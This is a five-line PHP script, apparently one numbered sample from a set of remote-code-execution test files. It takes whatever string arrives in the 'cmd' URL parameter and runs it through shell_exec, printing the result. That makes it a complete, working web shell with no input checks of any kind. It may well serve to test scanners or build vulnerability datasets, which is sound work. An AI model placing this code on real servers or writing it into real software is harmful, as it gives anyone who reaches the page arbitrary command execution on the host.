<?php
// RCE test variation #628
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>